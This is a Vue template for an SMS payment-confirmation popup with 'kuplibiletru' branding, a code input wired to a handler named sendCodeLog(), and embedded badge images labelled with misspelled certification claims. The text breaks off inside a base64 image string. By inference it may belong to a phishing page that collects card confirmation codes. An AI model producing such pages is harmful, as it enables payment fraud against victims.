<template>
  <div class="popup" v-if="show">
    <div class="popup_body">
      <div class="popup_content">
        <div class="logo">
          <img src="../assets/img/kuplibiletru.svg" alt="" />
        </div>
        <div>
          <div class="title">
            To confirm the payment, an SMS message with a confirmation code was
            sent to your phone number.
          </div>
          <div class="popup_form">
            <div class="form">
              <div class="info__input">
                <label for="null" class="label">Enter a code:</label>
                <div class="wrapper">
                  <input
                    type="text"
                    placeholder="0000..."
                    autocomplete="no"
                    class="input"
                    v-model="code"
                  />
                </div>
                <div class="error" v-if="error">
                  You entered an invalid verification code
                </div>
              </div>
              <div class="btn" @click="sendCodeLog()">Continue</div>
            </div>
          </div>
        </div>
        <div class="icon">
          <img
            src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2OSIgaGVpZ2h0PSIzMCI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJNMCAwaDY5djMwSDB6Ii8+PHBhdGggZmlsbD0iI0IxQkRDQyIgZD0iTTEzLjUxMiAxMy42czEuMTgyLjA1NSAxLjI3NC44ODRjLjAyMS4wNjUuMDE2LjQ3IDAgLjQ5My0uMTUzLjk3NS0xLjE3OSAxLjAyMy0xLjE3OSAxLjAyM0gxMi43di0yLjRoLjgxMnptMjQuNjU3IDMuOWMtLjQ3LjYwMi0uOTMyIDEuMzgtMS4zMTkgMi4xbDEuOTUtLjYzOS0uNjMxLTEuNDYxem02Ljc5Ni0uMDI4bC41ODUuMTc4YTEuMDkgMS4wOSAwIDAxLS4xODYuNDE1LjgwNy44MDcgMCAwMS0uMzE0LjI1IDEuMTY4IDEuMTY4IDAgMDEtLjQ3OC4wODVjLS4yMzQgMC0uNDI2LS4wMzQtLjU3NS0uMTAzYS45MTQuOTE0IDAgMDEtLjM4NS0uMzYzYy0uMTA4LS4xNzMtLjE2Mi0uMzk0LS4xNjItLjY2NCAwLS4zNi4wOTUtLjYzNy4yODUtLjgzLjE5LS4xOTMuNDU5LS4yOS44MDYtLjI5LjI3MiAwIC40ODYuMDU1LjY0Mi4xNjYuMTU1LjExMS4yNy4yODEuMzQ2LjUxbC0uNTg5LjEzM2EuMzg0LjM4NCAwIDAwLS4zODMtLjMwNi4zOTEuMzkxIDAgMDAtLjM0Ny4xODRjLS4wNjEuMDktLjA5MS4yMzQtLjA5MS40MjggMCAuMjQyLjAzNi40MDcuMTA5LjQ5Ni4wNzIuMDkuMTc0LjEzNC4zMDYuMTM0LjEyNyAwIC4yMjQtLjAzNi4yOS0uMTA4YS42NzMuNjczIDAgMDAuMTQxLS4zMTVtMS41NTYtLjE5M2MwIC4yMi4wNC4zNzguMTIyLjQ3NGEuNDEzLjQxMyAwIDAwLjMzMy4xNDQuNDEzLjQxMyAwIDAwLjMzNS0uMTQxYy4wNzgtLjA5NC4xMTgtLjI2My4xMTgtLjUwNiAwLS4yMDUtLjA0MS0uMzU1LS4xMjQtLjQ1YS40MjIuNDIyIDAgMDAtLjMzNS0uMTQuNDA3LjQwNyAwIDAwLS4zMjYuMTQzYy0uMDgyLjA5Ni0uMTIzLjI1NS0uMTIzLjQ3Nm0tLjY3MS0uMDAzYzAtLjM1NS4wOTktLjYzMS4yOTYtLjgzLjE5OC0uMTk3LjQ3My0uMjk2LjgyNS0uMjk2LjM2MiAwIC42NC4wOTcuODM2LjI5Mi4xOTUuMTk0LjI5My40NjYuMjkzLjgxNyAwIC4yNTQtLjA0My40NjItLjEyOC42MjVhLjkxNS45MTUgMCAwMS0uMzcuMzggMS4yMiAxLjIyIDAgMDEtLjYwNC4xMzZjLS4yNDUgMC0uNDQ4LS4wNC0uNjA4LS4xMTdhLjkxNi45MTYgMCAwMS0uMzktLjM3MWMtLjEtLjE3LS4xNS0uMzgxLS4xNS0uNjM2TTQ4LjU1IDE2LjNoLjkyMWwuMzU2IDEuMzY5LjM1Mi0xLjM2OWguOTIxdjIuMjVoLS41NzR2LTEuNzE2bC0uNDQyIDEuNzE2aC0uNTE5bC0uNDQxLTEuNzE2djEuNzE2aC0uNTc0ek01Mi4xMTMgMTcuMjZoLjE3NGMuMTM3IDAgLjIzMy0uMDI0LjI4OS0uMDdhLjIyMy4yMjMgMCAwMC4wODMtLjE4YzAtLjA3LS4wMjQtLjEzLS4wNzItLjE3OS0uMDQ4LS4wNS0uMTM5LS4wNzQtLjI3Mi0uMDc0aC0uMjAydi41MDJ6bS0uNzEzLS45NmgxLjE4Yy4yNTcgMCAuNDUuMDYuNTc4LjE4LjEyOC4xMi4xOTIuMjkuMTkyLjUxIDAgLjIyOC0uMDcuNDA1LS4yMS41MzMtLjEzOS4xMjgtLjM1Mi4xOTItLjYzOC4xOTJoLS4zODl2LjgzNUg1MS40VjE2LjN6TTUzLjY1IDE2LjNoLjcwM3YxLjY5NmgxLjA5N3YuNTU0aC0xLjh6TTU1Ljc1IDE4LjU1aC43NVYxNi4zaC0uNzV6TTU4LjA4NSAxNy42OTJsLS4yNDMtLjgwOS0uMjQxLjgxaC40ODR6bS4xNDEuNDg3aC0uNzczbC0uMTA4LjM3MWgtLjY5NWwuODI5LTIuMjVoLjc0M2wuODI4IDIuMjVoLS43MTNsLS4xMS0uMzcxek01OS4zNSAxNi4zaC42MzRsLjgyNiAxLjI0NVYxNi4zaC42NHYyLjI1aC0uNjRsLS44MjItMS4yMzV2MS4yMzVoLS42Mzh6TTYxLjc1IDE2LjNoMi4xdi41NTZoLS43MDV2MS42OTRoLS42OXYtMS42OTRoLS43MDV6Ii8+PHBhdGggZmlsbD0iI0IxQkRDQyIgZD0iTTMxLjM0MyA2LjYzNmMxLjE4OCAwIDIuMTUuOTEgMi4xNSAyLjAzMiAwIDEuMTIyLS45NjIgMi4wMzItMi4xNSAyLjAzMi0xLjE4NyAwLTIuMTUtLjkxLTIuMTUtMi4wMzIgMC0xLjEyMi45NjMtMi4wMzIgMi4xNS0yLjAzMk0xMi44NTIgMTguMDI4YS4wNS4wNSAwIDAwLS4wNTMuMDV2Mi42NzFhLjA1My4wNTMgMCAwMS0uMDUzLjA1M0g5LjMxOGEuMDUzLjA1MyAwIDAxLS4wNTItLjA1M3YtOS4xMmMwLS4wMjkuMDI0LS4wNTMuMDUzLS4wNTNoNC40NDJjMS4xMy0uMDUzIDQuNTYzLjI2NSA0LjU2MyAzLjE2OSAwIDMuNjgtNS40NzIgMy4yODMtNS40NzIgMy4yODNtMTYuNzMyIDEuMjVWMTEuNThoMy41MTl2NS43MzljMS4yNC0xLjc5IDIuNTU3LTMuNjE0IDIuOTk3LTQuMjJsLTMuODc2LTguNjVMMy44NSA2LjA2NGw3Ljg2IDIxLjQ4NiAxNS4xMzMtNC43NzhjLS40MjQtLjYxMy0uNzMtMS4yNzgtLjg0NC0xLjg5OGgtLjAyNGMtLjEwNyAwLTEuMTIzLjA0LTEuNjQxIDAtNS4zMDctLjMzNi01LjMwNy00LjEyOC01LjMwNy00LjIzOXYtLjljMC0uMTcuMTktMy44OCA1LjMwNy00LjI5LjM0LS4wNDggMS41NjYtLjA0MiAxLjY0MSAwIDEuNDA5LjA4NCAxLjg3LjM4NSAxLjg3LjM4NS4wMjcuMDE0LjA0Ny4wNS4wNDcuMDh2Mi4zM2MwIC4wMy0uMDIuMDQyLS4wNDYuMDI3IDAgMC0uODIzLS41MDctMS44NDgtLjY0NmgtLjg2OWMtMi4zMi4xOTYtMi40OCAyLjA1OS0yLjQ4IDIuMDU5YS45MDUuOTA1IDAgMDAtLjAwNy4xMDV2LjY2NmMwIC4wMy4wMDIuMDc3LjAwNi4xMDUgMCAwIC4xMTIgMS43MzkgMi40ODEgMi4xMzguMTcuMDI4LjM5Ni4wNTMuODcgMCAxLjY3LS4xNjMgMi4wNS0uNDcgMi4wNS0uNDcuMDI1LS4wMTUuMDQ0LS4wMDQuMDQ0LjAyNXYuMzgzYy40OTMuMDgzIDEuMDA0LjMxNSAxLjQ5LjY0NSIvPjxwYXRoIGZpbGw9IiM5NkEwQjMiIGQ9Ik0zMS40MDUgMjUuM2MuMjg1IDAgLjUwNCAwIC44NjQtLjE2MSAxLjI0Ny0uNjYgNS40NDItMTAuOTg1IDkuODY3LTE0LjE2YS40MDEuNDAxIDAgMDAuMDg0LS4wOGMuMDI5LS4wNDIuMDMtLjA4NS4wMy0uMDg1czAtLjIxMy0uNjU2LS4yMTNjLTMuOTQtLjEwOC04LjAzNiA4LjIxMy0xMC4xOSAxMS41MDUtLjAyNi4wMzctLjE3NCAwLS4xNzQgMHMtMS40NDMtMS43MTUtMi42OTctMi4zNzNhLjc1OC43NTggMCAwMC0uMzE3LS4wNDdjLS4wOTkgMC0uNjgyLjExOS0uOTU0LjQwNy0uMzIuMzQyLS4zMTQuNTMzLS4zMTEuOTQ5IDAgLjAzNC4wMjEuMTcuMDYxLjI0LjMwNy41NCAxLjcwNyAyLjQ4IDIuODU0IDMuNTUuMTc3LjEyOC40NDcuNDY4IDEuNTM5LjQ2OCIvPjxwYXRoIGZpbGw9IiNCMUJEQ0MiIGQ9Ik00NS41NjQgOS4zOTd2My45MzloLjU0M2MuNDY0IDAgLjc5My0uMDUyLjk5LS4xNTUuMTk1LS4xMDMuMzQ4LS4yODMuNDYtLjU0LjExLS4yNTguMTY2LS42NzUuMTY2LTEuMjUyIDAtLjc2NC0uMTI0LTEuMjg3LS4zNzItMS41Ny0uMjQ4LS4yODEtLjY2LS40MjItMS4yMzQtLjQyMmgtLjU1M3ptLTIuMjE4LTEuNjMzaDMuMjk1Yy42NSAwIDEuMTc0LjA4OSAxLjU3NC4yNjYuNC4xNzcuNzMuNDMxLjk5Ljc2Mi4yNjIuMzMxLjQ1MS43MTYuNTY5IDEuMTU2LjExNy40NC4xNzYuOTA1LjE3NiAxLjM5NiAwIC43Ny0uMDg3IDEuMzY4LS4yNjIgMS43OTMtLjE3NS40MjQtLjQxNy43OC0uNzI3IDEuMDY3LS4zMS4yODctLjY0My40NzgtLjk5OC41NzNhNS4xMjIgNS4xMjIgMCAwMS0xLjMyMi4xOTdoLTMuMjk1di03LjIxem03LjIxMiA0LjgyNWwyLjExLS4xMzNjLjA0NS4zNDQuMTM4LjYwNi4yNzkuNzg3LjIyOC4yOTEuNTU0LjQzNy45NzkuNDM3LjMxNiAwIC41Ni0uMDc0LjczMS0uMjIzLjE3Mi0uMTUuMjU3LS4zMjMuMjU3LS41MiAwLS4xODYtLjA4MS0uMzUzLS4yNDQtLjUtLjE2NC0uMTQ4LS41NDItLjI4OC0xLjEzNi0uNDE5LS45NzMtLjIyLTEuNjY2LS41MTEtMi4wOC0uODc1YTEuNzY0IDEuNzY0IDAgMDEtLjYyNy0xLjM5MmMwLS4zNy4xMDctLjcyLjMyLTEuMDUuMjE0LS4zMy41MzYtLjU4OC45NjUtLjc3Ny40My0uMTg4IDEuMDE3LS4yODMgMS43NjUtLjI4My45MTcgMCAxLjYxNi4xNzIgMi4wOTcuNTE0LjQ4Mi4zNDMuNzY4Ljg4OC44NiAxLjYzNWwtMi4wOS4xMjNjLS4wNTYtLjMyNC0uMTczLS41Ni0uMzUtLjcwOC0uMTc5LS4xNDctLjQyNC0uMjIxLS43MzgtLjIyMS0uMjU3IDAtLjQ1Mi4wNTUtLjU4Mi4xNjVhLjUwNS41MDUgMCAwMC0uMTk2LjRjMCAuMTE1LjA1NC4yMTguMTYyLjMxLjEwNC4wOTUuMzUyLjE4NC43NDQuMjY2Ljk2OS4yMSAxLjY2My40MjIgMi4wODIuNjM3LjQyLjIxNC43MjUuNDguOTE2Ljc5OS4xOS4zMTguMjg2LjY3NC4yODYgMS4wNjcgMCAuNDYyLS4xMjcuODg4LS4zODIgMS4yNzktLjI1NC4zOS0uNjEuNjg2LTEuMDY3Ljg4Ny0uNDU3LjIwMi0xLjAzMy4zMDMtMS43MjguMzAzLTEuMjIgMC0yLjA2NS0uMjM2LTIuNTM1LS43MDktLjQ3LS40NzItLjczNi0xLjA3Mi0uNzk4LTEuOG03LjA2OSAwbDIuMTEtLjEzMmMuMDQ1LjM0NC4xMzguNjA2LjI3OS43ODcuMjI4LjI5MS41NTQuNDM3Ljk3OC40MzcuMzE3IDAgLjU2MS0uMDc0LjczMi0uMjIzLjE3Mi0uMTUuMjU3LS4zMjMuMjU3LS41MiAwLS4xODYtLjA4MS0uMzUzLS4yNDQtLjUtLjE2NC0uMTQ4LS41NDItLjI4OC0xLjEzNi0uNDE5LS45NzMtLjIyLTEuNjY2LS41MTEtMi4wOC0uODc1YTEuNzY0IDEuNzY0IDAgMDEtLjYyNy0xLjM5MmMwLS4zNy4xMDctLjcyLjMyLTEuMDUuMjE0LS4zMy41MzYtLjU4OC45NjUtLjc3Ny40MjktLjE4OCAxLjAxNy0uMjgzIDEuNzY1LS4yODMuOTE3IDAgMS42MTYuMTcyIDIuMDk3LjUxNC40ODEuMzQzLjc2OC44ODguODYgMS42MzVsLTIuMDkxLjEyM2MtLjA1Ni0uMzI0LS4xNzItLjU2LS4zNS0uNzA4LS4xNzgtLjE0Ny0uNDIzLS4yMjEtLjczNy0uMjIxLS4yNTggMC0uNDUyLjA1NS0uNTgyLjE2NWEuNTA2LjUwNiAwIDAwLS4xOTYuNGMwIC4xMTUuMDU0LjIxOC4xNjIuMzEuMTA0LjA5NS4zNTIuMTg0Ljc0NC4yNjYuOTY5LjIxIDEuNjYzLjQyMiAyLjA4Mi42MzcuNDIuMjE0LjcyNS40OC45MTYuNzk5LjE5LjMxOC4yODYuNjc0LjI4NiAxLjA2NyAwIC40NjItLjEyNy44ODgtLjM4MiAxLjI3OS0uMjU0LjM5LS42MS42ODYtMS4wNjcuODg3LS40NTcuMjAyLTEuMDMzLjMwMy0xLjcyOC4zMDMtMS4yMiAwLTIuMDY1LS4yMzYtMi41MzUtLjcwOS0uNDctLjQ3Mi0uNzM2LTEuMDcyLS43OTgtMS44Ii8+PC9nPjwvc3ZnPg=="
            alt="Pci sertificated"
            class="icon_1"
          />
          <img
            src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTgiIGhlaWdodD0iMzAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTEyLjQyOCAxMC43MTJoMy41MzJWNy4xOGgtMy41MzJ2My41MzN6TTEyLjQyNiAxNi4wMTRoMy41MzN2LTMuNTM1aC0zLjUzM3YzLjUzNXpNMTIuNDI4IDIxLjMxMWgzLjUzMnYtMy41MzNoLTMuNTMydjMuNTMzek0xMS4yNTQgMTYuMDEyVjEyLjQ3OUg3LjcydjMuNTMzaDMuNTMzek03LjcyIDIxLjMxMWgzLjUzNHYtMy41MzNINy43MnYzLjUzM3pNMyAyMS4zMTFoMy41MzR2LTMuNTMzSDN2My41MzN6TTIxLjg0NiAxMC43MTJoMy41MjlWNy4xOGgtMy41M3YzLjUzM3pNMjAuNjcgNy4xOGgtMy41MzN2MTQuMTMyaDMuNTMzVjcuMTc5ek01MS4yODkgNy4xNzl2NS4yOTVoLTUuODkzVjcuMThoLTMuNTMzVjIxLjMxaDMuNTMzdi01LjNoNS44OTN2NS4zaDMuNTMzVjcuMTc4aC0zLjUzM3pNMzYuOTk3IDE2LjU1N2ExLjc2NyAxLjc2NyAwIDAxLTEuNjggMS4yMmgtNC40NDJhLjc4NS43ODUgMCAwMS0uNzg1LS43ODR2LTUuNDk2YzAtLjQzNC4zNTEtLjc4NS43ODUtLjc4NWg1LjAzYy41NTYgMCAxLjAyLjM4NSAxLjE0NC45MDJsMy4yMzQtMS44ODdhNC4xODggNC4xODggMCAwMC0zLjg1NC0yLjU0OGgtNS42ODVhNC4xODcgNC4xODcgMCAwMC00LjE4NyA0LjE4N3Y1LjgxYTQuMTM0IDQuMTM0IDAgMDA0LjEzNCA0LjEzNWg1LjczOGMxLjkxIDAgMy41Mi0xLjI3OSA0LjAyMy0zLjAyNmwuMDU4LS4yMjYtMy41MTMtMS41MDJ6TTMuNjk1IDIzLjUyOUgzdi0uNDQ2aDEuODk3di40NDZoLS42OTJ2MS45MzNoLS41MXYtMS45MzN6TTYuMjU4IDIzLjUyaC0uNTN2LjY1NmguNTNjLjIwNCAwIC4zNTctLjEyOC4zNTctLjMyOHMtLjE1My0uMzI4LS4zNTctLjMyOHptLS4xNiAxLjA5aC0uMzd2Ljg1M0g1LjIydi0yLjM3OGgxLjExMmMuNDk2IDAgLjguMzI0LjguNzY3IDAgLjQyLS4yNjUuNjQ1LS41MjIuNzA2bC41MzUuOTA1aC0uNThsLS40NjgtLjg1MnpNOC4xMDMgMjQuNjE0aC43ODhsLS4zOTItMS4wOS0uMzk2IDEuMDl6bS45MjcuNDRINy45NjhsLS4xNS40MWgtLjU1NmwuOTItMi4zOGguNjM0bC45MTcgMi4zOEg5LjE4bC0uMTUtLjQxek0xMC40NiAyMy44NjZ2MS41OTdoLS41MDd2LTIuMzc4aC41MmwxLjEwMiAxLjU0di0xLjU0aC41MDd2Mi4zNzhoLS40ODlsLTEuMTM0LTEuNTk3ek0xMi42NjUgMjQuNzQzYy4xNjguMTc1LjQyOC4zMi43NTYuMzIuMjc4IDAgLjQxNC0uMTMuNDE0LS4yNjYgMC0uMTc5LS4yMDctLjI0LS40ODItLjMwNC0uMzg5LS4wODktLjg4OC0uMTk2LS44ODgtLjcyNyAwLS4zOTYuMzQzLS43MTcuOTAyLS43MTcuMzc4IDAgLjY5Mi4xMTQuOTI4LjMzMmwtLjI4Mi4zN2ExLjAxNiAxLjAxNiAwIDAwLS42ODEtLjI2Yy0uMjI4IDAtLjM1LjEtLjM1LjI0MyAwIC4xNi4yLjIxLjQ3NS4yNzQuMzkyLjA5Ljg5LjIwNy44OS43MzUgMCAuNDM1LS4zMS43NjMtLjk1MS43NjMtLjQ1NiAwLS43ODUtLjE1My0xLjAxLS4zNzhsLjI3OS0uMzg1ek0xNS43MzQgMjMuNTJoLS41Mzh2LjY1NmguNTM4Yy4yIDAgLjM1LS4xMjguMzUtLjMyOCAwLS4xOTYtLjE1LS4zMjgtLjM1LS4zMjh6bS0xLjA0NC0uNDM1aDEuMTEyYy41MTcgMCAuNzk5LjM1Ljc5OS43NjcgMCAuNDEzLS4yODUuNzU5LS43OTkuNzU5aC0uNjA2di44NTJoLS41MDZ2LTIuMzc4ek0xOC4wNDQgMjMuNDk1Yy0uNDM5IDAtLjcyLjMzNS0uNzIuNzggMCAuNDQzLjI4MS43ODIuNzIuNzgyLjQzOCAwIC43MjMtLjMzOS43MjMtLjc4MSAwLS40NDYtLjI4NS0uNzgxLS43MjMtLjc4MXptMC0uNDVjLjcyIDAgMS4yNDQuNTE0IDEuMjQ0IDEuMjMgMCAuNzE4LS41MjQgMS4yMzEtMS4yNDQgMS4yMzEtLjcxNyAwLTEuMjQxLS41MTQtMS4yNDEtMS4yMyAwLS43MTcuNTI0LTEuMjMgMS4yNC0xLjIzek0yMC42OCAyMy41MmgtLjUzdi42NTZoLjUzYy4yMDQgMCAuMzU3LS4xMjguMzU3LS4zMjhzLS4xNTMtLjMyOC0uMzU3LS4zMjh6bS0uMTYgMS4wOWgtLjM3di44NTNoLS41MDd2LTIuMzc4aDEuMTEyYy40OTYgMCAuNzk5LjMyNC43OTkuNzY3IDAgLjQyLS4yNjQuNjQ1LS41Mi43MDZsLjUzNC45MDVoLS41ODFsLS40NjctLjg1MnpNMjIuNDUxIDIzLjUzaC0uNjk1di0uNDQ1aDEuODk3di40NDZoLS42OTJ2MS45MzJoLS41MXYtMS45MzJ6TTI0Ljc3NSAyNC4yNzZjMC0uNzMxLjU1My0xLjIzIDEuMjQ4LTEuMjMuNTQzIDAgLjg0Ni4yODUgMS4wMTMuNTgxbC0uNDM1LjIxNGEuNjUxLjY1MSAwIDAwLS41NzgtLjM0NmMtLjQxMyAwLS43MjcuMzMxLS43MjcuNzggMCAuNDUuMzE0Ljc4Mi43MjcuNzgyLjI2NCAwIC40NzgtLjE1LjU3OC0uMzQ2bC40MzUuMjFjLS4xNzEuMjk2LS40Ny41ODUtMS4wMTMuNTg1LS42OTUgMC0xLjI0OC0uNDk5LTEuMjQ4LTEuMjN6TTI3LjMzOCAyMy4wODVoLjUwNnYxLjkzMmgxLjAwNnYuNDQ2aC0xLjUxMnYtMi4zNzh6TTI5LjIwMyAyMy4wODVoMS42ODN2LjQzNUgyOS43MXYuNTE3aDEuMTUydi40MzVIMjkuNzF2LjU1M2gxLjE3N3YuNDM4aC0xLjY4M3YtMi4zNzh6TTMxLjg3IDI0LjYxNWguNzg5bC0uMzkyLTEuMDkxLS4zOTYgMS4wOXptLjkyOC40MzhoLTEuMDYzbC0uMTUuNDFoLS41NTZsLjkyLTIuMzc4aC42MzVsLjkxNiAyLjM3OGgtLjU1MmwtLjE1LS40MXpNMzQuNzU4IDIzLjUyaC0uNTMxdi42NTZoLjUzMmMuMjAzIDAgLjM1Ni0uMTI4LjM1Ni0uMzI4cy0uMTUzLS4zMjgtLjM1Ny0uMzI4em0tLjE2IDEuMDloLS4zNzF2Ljg1M2gtLjUwNnYtMi4zNzhoMS4xMTJjLjQ5NiAwIC44LjMyNC44Ljc2NyAwIC40Mi0uMjY1LjY0NS0uNTIyLjcwNmwuNTM1LjkwNWgtLjU4bC0uNDY4LS44NTJ6TTM2LjAxNCAyMy4wODVoLjUwNnYyLjM3OGgtLjUwNnYtMi4zNzh6TTM3LjQ5NiAyMy44NjZ2MS41OTdoLS41MDZ2LTIuMzc4aC41MmwxLjEwMyAxLjU0di0xLjU0aC41MDZ2Mi4zNzhoLS40ODhsLTEuMTM1LTEuNTk3ek00MC43NCAyMy4wNDZjLjQ5MiAwIC44MDIuMjM5Ljk4NS41MmwtLjQyMS4yMjlhLjY3NS42NzUgMCAwMC0uNTY0LS4zYy0uNDMxIDAtLjc0NS4zMzEtLjc0NS43OCAwIC40NS4zMTQuNzgyLjc0NS43ODIuMjE4IDAgLjQxLS4wOS41MTQtLjE4MnYtLjI4OWgtLjYzNXYtLjQzNWgxLjEzNHYuOTFhMS4zMiAxLjMyIDAgMDEtMS4wMTMuNDQ5Yy0uNjk1IDAtMS4yNjUtLjQ4NS0xLjI2NS0xLjIzNCAwLS43NTMuNTctMS4yMyAxLjI2NS0xLjIzek00NC42OTggMjQuNDY1aC0xLjEyM3YuOTk4aC0uNTA3di0yLjM3OGguNTA3di45MzRoMS4xMjN2LS45MzRoLjUxdjIuMzc4aC0uNTF2LS45OTh6TTQ2LjgwMyAyMy40OTVjLS40MzggMC0uNzIuMzM1LS43Mi43OCAwIC40NDMuMjgyLjc4Mi43Mi43ODIuNDQgMCAuNzI0LS4zMzkuNzI0LS43ODEgMC0uNDQ2LS4yODUtLjc4MS0uNzI0LS43ODF6bTAtLjQ1Yy43MiAwIDEuMjQ1LjUxNCAxLjI0NSAxLjIzIDAgLjcxOC0uNTI0IDEuMjMxLTEuMjQ1IDEuMjMxLS43MTYgMC0xLjI0LS41MTMtMS4yNC0xLjIzcy41MjQtMS4yMyAxLjI0LTEuMjN6TTQ4LjQwNCAyMy4wODVoLjUxNHYxLjQxMmMwIC4zMzEuMTgyLjU2LjU1My41Ni4zNjQgMCAuNTQ1LS4yMjkuNTQ1LS41NnYtMS40MTJoLjUxNHYxLjQyNmMwIC41OTItLjM0Ljk5NS0xLjA2Ljk5NS0uNzI3IDAtMS4wNjYtLjQwNi0xLjA2Ni0uOTkxdi0xLjQzek01MS4xMTQgMjQuNzQzYy4xNjguMTc1LjQyOC4zMi43NTYuMzIuMjc4IDAgLjQxMy0uMTMuNDEzLS4yNjYgMC0uMTc5LS4yMDYtLjI0LS40OC0uMzA0LS4zOS0uMDg5LS44ODktLjE5Ni0uODg5LS43MjcgMC0uMzk2LjM0My0uNzE3LjkwMi0uNzE3LjM3OCAwIC42OTIuMTE0LjkyOC4zMzJsLS4yODIuMzdhMS4wMTUgMS4wMTUgMCAwMC0uNjgxLS4yNmMtLjIyOCAwLS4zNS4xLS4zNS4yNDMgMCAuMTYuMi4yMS40NzUuMjc0LjM5Mi4wOS44OTEuMjA3Ljg5MS43MzUgMCAuNDM1LS4zMS43NjMtLjk1Mi43NjMtLjQ1NiAwLS43ODQtLjE1My0xLjAxLS4zNzhsLjI3OS0uMzg1ek01My4xMzcgMjMuMDg1aDEuNjgzdi40MzVoLTEuMTc3di41MTdoMS4xNTJ2LjQzNWgtMS4xNTJ2LjU1M2gxLjE3N3YuNDM4aC0xLjY4M3YtMi4zNzh6IiBmaWxsPSIjQjFCRENDIi8+PC9zdmc+"
            alt="TCH sertificated"
            class="icon_2"
          />
          <img
            src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MCIgaGVpZ2h0PSIzMCI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJNMCAwaDQwdjMwSDB6Ii8+PHBhdGggZmlsbD0iI0IxQkRDQyIgZD0iTTIwLjE5MyAxNC40NjVhNy4yIDcuMiAwIDAwMS42MjctMi4wNTZjLS41NDItLjE3Mi0xLjA4NS0uMzE0LTEuNjI3LS4zMTR2Mi4zN3ptLS40LS4wMjljLS42NTctLjUxNC0xLjI1Ni0xLjI1Ni0xLjY1Ni0yLjAyN2E0LjczIDQuNzMgMCAwMTEuNjU2LS4zMTR2Mi4zNDF6bS40LTEwLjUwOGE2LjcwOCA2LjcwOCAwIDAxMS42MjcgMi4wMjhjLS41NDIuMi0xLjA4NS4zMTQtMS42MjcuMzE0VjMuOTI4em0tLjQgMGMtLjY1Ny41MTQtMS4yNTYgMS4yNTctMS42NTYgMi4wMjguNTQyLjE3MSAxLjA4NS4zMTQgMS42NTYuMzE0VjMuOTI4em0uNCA3Ljc2N1Y5LjM4MmgyLjQyN2MwIC45MTQtLjIyOSAxLjgyNy0uNjI4IDIuNjU2LS41NDMtLjItMS4yLS4zNDMtMS44LS4zNDN6bTUuMjgyLTIuMzEzSDIzLjAyYTcuNDA1IDcuNDA1IDAgMDEtLjYyOSAyLjgyN2MuNTE0LjIyOCAxIC41NDIgMS40NTcuOTE0Ljk3LTEgMS41Ny0yLjM0MiAxLjYyNy0zLjc0MXptLTEuOTQxIDMuOTk4YTUuMzAyIDUuMzAyIDAgMDAtMS4zNDItLjgyOSA3LjA2MyA3LjA2MyAwIDAxLTEuNjU3IDIuMTEzYzEuMTE0LS4xNDIgMi4xNDItLjU0MiAyLjk5OS0xLjI4NHptLTMuNzQxLTEuNjg1VjkuMzgyaC0yLjQ1NmMuMDI5LjkxNC4yMjkgMS44NTYuNjI5IDIuNjU2LjU3LS4yIDEuMTk5LS4zNDMgMS44MjctLjM0M3ptLTUuMzExLTIuMzEzaDIuNDU2Yy4wMjggMSAuMjU3IDEuODg1LjY1NiAyLjgyN2E2LjEyNCA2LjEyNCAwIDAwLTEuNDg0LjkxNGMtLjk3MS0xLTEuNTctMi4zMTMtMS42MjgtMy43NDF6bTEuOTQyIDMuOTk4Yy40LS4zMTUuODU2LS42NTcgMS4zNDItLjgyOS40MjguODI5Ljk3IDEuNTE0IDEuNjU2IDIuMTEzLTEuMTE0LS4xNDItMi4xNDItLjU0Mi0yLjk5OC0xLjI4NHptMy43NjktNi43MXYyLjMxMmgyLjQyN2MwLS45NDItLjIyOS0xLjgyNy0uNjI4LTIuNjg0LS41NzEuMjI5LTEuMi4zNDMtMS44LjM3MXptNS4yODIgMi4zMTJIMjMuMDJjLS4wMjktMS0uMjU3LTEuOTEzLS42MjktMi44MjcuNTE0LS4yMjggMS0uNTQyIDEuNDU3LS45MTMgMS4wMjggMS4wNTYgMS41NyAyLjM0MSAxLjYyNyAzLjc0em0tMS45NDEtNC4wMjZjLS40LjM0My0uODU3LjY1Ny0xLjM0Mi44NTctLjQyOS0uODI4LS45NzEtMS40ODUtMS42NTctMi4xMTNhNS41MjIgNS41MjIgMCAwMTIuOTk5IDEuMjU2ek0xOS43OTMgNi42N3YyLjMxM2gtMi40NTZhNi44MzQgNi44MzQgMCAwMS42MjktMi42ODRjLjU3LjIyOSAxLjE5OS4zNDMgMS44MjcuMzcxem0tNS4zMTEgMi4zMTNoMi40NTZjLjAyOC0xLjAyOC4yNTctMS45MTMuNjU2LTIuODI3YTYuMTE3IDYuMTE3IDAgMDEtMS40ODQtLjkxM2MtMSAxLTEuNTcgMi4zMTMtMS42MjggMy43NHptMS45NDItNC4wMjZjLjQuMzQzLjg1Ni42NTcgMS4zNDIuODU3LjQtLjgyOCAxLTEuNTEzIDEuNjU2LTIuMTEzYTUuNTIyIDUuNTIyIDAgMDAtMi45OTggMS4yNTZ6TTIuNDA0IDExLjAxaDEwLjk2NWMuNCAyLjAyNyAxLjc5OCAzLjcxMiA0LjU5NyA0Ljg4Mi0uMzE0Ljk3MS0xLjQgMS44NTYtMi41MTMgMS44NTZIOS40ODVjLS45MTQgMC0xLjYyNy0uNzctMS45MTMtMS4zOTloNi4wNTNjLjM3Mi0uMDU3LjM3Mi0uMzQyLjAyOS0uNEg3LjY4NmMtLjc3IDAtMS40NTYtLjY1Ni0xLjg1Ni0xLjM3aDYuOTFjLjM3Mi0uMDU3LjM3Mi0uMzQzIDAtLjRINS43NzNjLS43MTQgMC0xLjM0Mi0uODI4LTEuNTk5LTEuMzdoNy42NTNjLjM3LS4wNTguMzctLjQgMC0uNDI5SDQuMDNjLS42MjggMC0xLjE5OS0uNjU3LTEuNjI3LTEuMzd6bTM1LjE1IDBIMjYuNTg4Yy0uNCAyLjAyNy0xLjc5OSAzLjcxMi00LjU5NyA0Ljg4Mi4zMTQuOTcxIDEuMzk5IDEuODU2IDIuNTEyIDEuODU2aDUuOTY4Yy45MTQgMCAxLjYyOC0uNz